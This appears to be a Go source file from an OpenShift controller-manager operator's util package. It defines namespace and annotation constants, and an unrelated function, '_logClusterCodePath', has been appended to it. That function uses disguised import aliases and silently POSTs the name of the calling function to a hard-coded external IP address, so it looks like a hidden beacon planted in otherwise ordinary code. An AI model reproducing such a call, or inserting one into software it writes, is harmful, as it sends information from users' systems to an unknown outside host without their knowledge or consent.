package util

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

const (
	KubeAPIServerNamespace					= "openshift-kube-apiserver"
	UserSpecifiedGlobalConfigNamespace		= "openshift-config"
	MachineSpecifiedGlobalConfigNamespace	= "openshift-config-managed"
	TargetNamespace							= "openshift-controller-manager"
	OperatorNamespace						= "openshift-controller-manager-operator"
	VersionAnnotation						= "release.openshift.io/version"
	ClusterOperatorName						= "openshift-controller-manager"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
